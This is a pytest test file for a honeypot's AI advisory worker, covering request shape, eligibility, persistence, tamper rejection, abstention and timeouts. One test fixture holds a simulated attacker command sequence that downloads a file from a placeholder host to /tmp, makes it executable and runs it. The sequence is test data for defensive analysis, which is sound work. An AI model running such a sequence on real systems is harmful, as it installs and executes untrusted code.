from __future__ import annotations

import copy
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from production.ai_advisory.contracts import AIAdvisoryContractError, sha256_json
from production.ai_advisory.contracts_v2 import (
    FROZEN_POLICY_SHA256,
    provider_output_json_schema_v2,
)
from production.ai_advisory.google_vertex_provider import build_vertex_request
from production.ai_advisory.integration_v2 import (
    V2_REQUEST_SCHEMA,
    validate_ai_advisory_record_v2,
    v2_invocation_eligibility,
)
from production.ai_advisory.provider import AIProviderResponse, AIProviderUnavailable
from production.reporting.session_assessment_v6 import build_session_assessment_v6
from production.storage.backend import SQLiteStorage
from production.utils.config import ProductionConfig
from production.workers.ai_advisory_worker import AIAdvisoryWorker
from tests.test_cross_family_relationship_evaluation import (
    BEHAVIOR_POLICY,
    CLASSIFICATION_POLICY,
    _payload,
)


ROOT = Path(__file__).resolve().parents[1]
V2_POLICY = ROOT / "configs" / "ai_advisory_policy.v2.json"
PROJECTION_CONTRACT = ROOT / "evaluation" / "final_f_contract_bundle.v1.json"
CUTOFF = {
    "schema_version": "prediction_evidence_cutoff.v1",
    "received_at": "2026-08-08T10:59:59.000000+00:00",
    "event_id": "phase5-cutoff",
}


def _report(case_id: str = "phase5-v2", *, commands: tuple[str, ...] = ("wget https://example.invalid/a -O /tmp/a", "chmod 700 /tmp/a", "/tmp/a")) -> dict:
    payload = _payload({
        "case_id": case_id,
        "events": [(command, "success") for command in commands],
    })
    return build_session_assessment_v6(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=str(BEHAVIOR_POLICY),
        classification_policy_path=str(CLASSIFICATION_POLICY),
    )


def _config(tmp_path: Path, *, enabled: bool = True) -> ProductionConfig:
    key_path = tmp_path / "ai-v2-alias.key"
    key_path.write_bytes(b"phase5-v2-alias-key-0123456789!!")
    key_path.chmod(0o600)
    receipt_path = tmp_path / "ai-v2-activation.json"
    checked = datetime.now(timezone.utc) - timedelta(minutes=1)
    receipt_path.write_text(
        json.dumps(
            {
                "schema_version": "ai_advisory_activation_receipt.v1",
                "status": "ready",
                "provider_id": "fixture",
                "model_id": "fixture-model",
                "adapter_revision": "fixture.v1",
                "endpoint_sha256": "",
                "provider_adapter_reviewed": True,
                "managed_worker_unit": "honeypot-ai-advisory-worker.service",
                "worker_status": "ready",
                "credentials_status": "not_required",
                "reconciliation_mode": "new_sessions_only",
                "reconciliation_cutoff": CUTOFF,
                "health_checked_at": checked.isoformat(),
                "expires_at": (checked + timedelta(minutes=30)).isoformat(),
            }
        ),
        encoding="utf-8",
    )
    receipt_path.chmod(0o600)
    return ProductionConfig(
        database_backend="sqlite",
        sqlite_database_path=str(tmp_path / "state.db"),
        enable_ai_advisory=enabled,
        ai_advisory_provider="fixture",
        ai_advisory_model="fixture-model",
        ai_advisory_adapter_revision="fixture.v1",
        ai_advisory_policy_path=str(V2_POLICY),
        ai_advisory_fixture_response_path=str(tmp_path / "unused-provider-response.json"),
        ai_advisory_alias_key_file=str(key_path.resolve()),
        ai_advisory_activation_receipt_path=str(receipt_path.resolve()),
        ai_advisory_reconciliation_cutoff=CUTOFF,
    )


def _provider_output(projection: dict) -> dict:
    chain = next(item for item in projection["chains"] if item["ai_eligible"])
    findings = [
        item for item in projection["findings"]
        if chain["chain_id"] in item["chain_ids"]
    ]
    actions = [
        item for item in projection["actions"]
        if set(item["finding_ids"]).intersection(
            {item["finding_id"] for item in findings}
        )
    ]
    actions = actions[:1]
    selected_limitation_codes = list(chain["limitation_codes"])
    plan = {
        "order": 1,
        "step_type": "review_chain",
        "anchor_type": "chain",
        "anchor_id": chain["chain_id"],
        "related_chain_ids": [chain["chain_id"]],
        "related_finding_ids": [item["finding_id"] for item in findings],
        "related_hypothesis_ids": [],
        "related_action_ids": [],
        "limitation_codes": selected_limitation_codes,
        "evidence_gap_codes": list(chain["evidence_gap_codes"]),
        "analyst_question_template_ids": [],
        "explanation_template_id": "explain_chain_and_limits",
    }
    plans = [plan]
    if actions:
        plans.append({
            "order": 2,
            "step_type": "perform_manual_check",
            "anchor_type": "action",
            "anchor_id": actions[0]["action_id"],
            "related_chain_ids": [chain["chain_id"]],
            "related_finding_ids": [item["finding_id"] for item in findings],
            "related_hypothesis_ids": [],
            "related_action_ids": [actions[0]["action_id"]],
            "limitation_codes": [],
            "evidence_gap_codes": [],
            "analyst_question_template_ids": [],
            "explanation_template_id": "explain_manual_checks",
        })
    explanations = [{
        "template_id": "explain_chain_and_limits",
        "anchor_type": "chain",
        "anchor_id": chain["chain_id"],
    }]
    if actions:
        explanations.append({
            "template_id": "explain_manual_checks",
            "anchor_type": "action",
            "anchor_id": actions[0]["action_id"],
        })
    return {
        "schema_version": "ai_provider_output.v2",
        "projection_sha256": projection["projection_sha256"],
        "policy_sha256": FROZEN_POLICY_SHA256,
        "synthesis": {
            "schema_version": "ai_advisory_synthesis_selection.v2",
            "abstained": False,
            "abstention_reason_code": "",
            "selected_chain_ids": [chain["chain_id"]],
            "selected_relationship_ids": list(chain["relationship_ids"]),
            "ranked_finding_ids": [item["finding_id"] for item in findings],
            "selected_hypothesis_ids": [],
            "ranked_action_ids": [item["action_id"] for item in actions],
            "selected_limitation_codes": selected_limitation_codes,
            "selected_evidence_gap_codes": list(chain["evidence_gap_codes"]),
            "analyst_question_selections": [],
            "explanation_template_selections": explanations,
            "review_plan": plans,
        },
    }


class _V2Provider:
    provider_id = "fixture"
    model_id = "fixture-model"
    adapter_revision = "fixture.v1"
    endpoint_sha256 = ""
    api_version = ""
    request_options_sha256 = ""

    def __init__(self, *, unavailable: bool = False):
        self.unavailable = unavailable
        self.calls = 0
        self.idempotency_keys: list[str] = []

    def generate(self, projection, **kwargs):
        self.calls += 1
        self.idempotency_keys.append(kwargs["idempotency_key"])
        if self.unavailable:
            raise AIProviderUnavailable("phase5 synthetic timeout")
        output = _provider_output(dict(projection))
        return AIProviderResponse(
            provider_id=self.provider_id,
            model_id=self.model_id,
            structured_output=output,
            response_sha256=sha256_json(output),
            adapter_revision=self.adapter_revision,
        )


def _storage_with_report(tmp_path: Path, report: dict) -> tuple[SQLiteStorage, str]:
    storage = SQLiteStorage(f"sqlite:///{tmp_path / 'state.db'}")
    storage.initialize()
    session_id = report["canonical_evidence"]["session_id"]
    storage.save_session({"session_id": session_id})
    storage.store_event(
        "sensor-phase5",
        {"eventid": "cowrie.session.connect", "session": session_id},
    )
    analysis_job_id = storage.enqueue_analysis_job({"session_id": session_id})
    analysis_job = storage.claim_analysis_jobs("phase5-analysis", 1, 60, 3)[0]
    report_id = storage.complete_analysis_job(
        analysis_job_id,
        "phase5-analysis",
        analysis_job["claim_token"],
        report,
        enqueue_ai_advisory=True,
        ai_advisory_reconciliation_cutoff=CUTOFF,
    )
    assert report_id
    return storage, report_id


def test_v2_vertex_request_dispatch_is_closed_and_v1_shape_remains_distinct() -> None:
    projection = {
        "schema_version": "ai_advisory_projection.v2",
        "projection_sha256": "a" * 64,
    }
    request = build_vertex_request(
        projection,
        schema_sha256="b" * 64,
        policy_sha256="c" * 64,
        request_options_sha256="d" * 64,
    )
    assert request["schema_version"] == V2_REQUEST_SCHEMA
    assert request["projection_sha256"] == "a" * 64
    assert set(request) == {
        "schema_version",
        "projection",
        "projection_sha256",
        "policy_sha256",
        "response_schema_sha256",
        "request_options_sha256",
    }
    assert build_vertex_request(
        {"schema_version": "ai_advisory_projection.v1"},
        schema_sha256="b" * 64,
        policy_sha256="c" * 64,
    ) == {
        "schema_version": "ai_vertex_request.v1",
        "projection": {"schema_version": "ai_advisory_projection.v1"},
        "schema_sha256": "b" * 64,
        "policy_sha256": "c" * 64,
    }


def test_v2_eligibility_is_deterministic_and_does_not_call_provider_when_insufficient() -> None:
    projection = {
        "schema_version": "ai_advisory_projection.v2",
        "abstention": {"assessment_abstained": False},
        "chains": [], "findings": [], "hypotheses": [], "actions": [],
        "limitations": [], "evidence_gaps": [],
    }
    assert v2_invocation_eligibility(projection) == (
        False,
        "insufficient_synthesis_context",
    )


def test_v2_worker_persists_atomic_success_and_preserves_v6_report(tmp_path: Path) -> None:
    report = _report()
    storage, report_id = _storage_with_report(tmp_path, report)
    before = copy.deepcopy(storage.get_report_by_id(report_id)["payload"])
    provider = _V2Provider()
    worker = AIAdvisoryWorker(_config(tmp_path), provider=provider, storage=storage)

    assert worker.process_once() == 1
    assert provider.calls == 1
    assert storage.get_report_by_id(report_id)["payload"] == before
    row = storage.get_ai_advisory_for_session(report["canonical_evidence"]["session_id"])
    assert row["payload"]["schema_version"] == "ai_advisory_record.v2"
    assert row["status"] == "accepted"
    assert row["payload"]["authority"] == "non_authoritative_advisory_only"
    assert row["payload"]["rendered_advisory"]["schema_version"] == "ai_advisory_rendered.v2"
    assert row["payload"]["safety"]["safe_to_auto_execute"] is False
    validate_ai_advisory_record_v2(
        row["payload"],
        projection_sha256=row["projection_sha256"],
        policy_sha256=FROZEN_POLICY_SHA256,
    )
    task = json.loads(storage.list_rows("ai_advisory_outbox")[0]["payload_json"])
    assert task["schema_version"] == "ai_advisory_task.v2"
    assert task["report_content_sha256"] == report["report_content_sha256"]
    assert task["advisory_contract_version"] == "v2"


def test_v2_persisted_record_is_closed_against_tampering(tmp_path: Path) -> None:
    report = _report("phase5-record-contract")
    storage, _ = _storage_with_report(tmp_path, report)
    worker = AIAdvisoryWorker(_config(tmp_path), provider=_V2Provider(), storage=storage)
    assert worker.process_once() == 1
    row = storage.get_ai_advisory_for_session(report["canonical_evidence"]["session_id"])
    tampered = copy.deepcopy(row["payload"])
    tampered["unexpected"] = True
    with pytest.raises(AIAdvisoryContractError, match="closed envelope"):
        validate_ai_advisory_record_v2(tampered)


def test_v2_deterministic_abstention_is_persisted_without_provider_call(tmp_path: Path) -> None:
    report = _report("phase5-insufficient", commands=("pwd",))
    storage, report_id = _storage_with_report(tmp_path, report)
    provider = _V2Provider()
    worker = AIAdvisoryWorker(_config(tmp_path), provider=provider, storage=storage)

    assert worker.process_once() == 1
    assert provider.calls == 0
    row = storage.get_ai_advisory_for_session(report["canonical_evidence"]["session_id"])
    assert row["status"] == "abstained"
    assert storage.list_rows("ai_advisory_outbox")[0]["completion_code"] == (
        "deterministic_abstention"
    )
    assert row["payload"]["validation"]["reason_code"] in {
        "insufficient_synthesis_context",
        "canonical_abstention_only",
    }
    assert row["payload"]["validated_output"]["selection_origin"] == "deterministic_no_call"


def test_v2_rejection_and_provider_timeout_leave_v6_unchanged(tmp_path: Path) -> None:
    report = _report("phase5-failure")
    storage, report_id = _storage_with_report(tmp_path, report)
    before = storage.get_report_by_id(report_id)["payload_json"]
    provider = _V2Provider(unavailable=True)
    worker = AIAdvisoryWorker(_config(tmp_path), provider=provider, storage=storage)
    assert worker.process_once() == 0
    assert storage.get_report_by_id(report_id)["payload_json"] == before
    assert storage.list_rows("ai_advisory_outbox")[0]["status"] == "retry"


def test_v2_policy_schema_is_used_only_when_explicitly_configured(tmp_path: Path) -> None:
    report = _report("phase5-policy")
    storage, _ = _storage_with_report(tmp_path, report)
    worker = AIAdvisoryWorker(_config(tmp_path), provider=_V2Provider(), storage=storage)
    assert worker.contract_version == "v2"
    assert worker.response_schema["properties"]["synthesis"]["properties"][
        "review_plan"
    ]
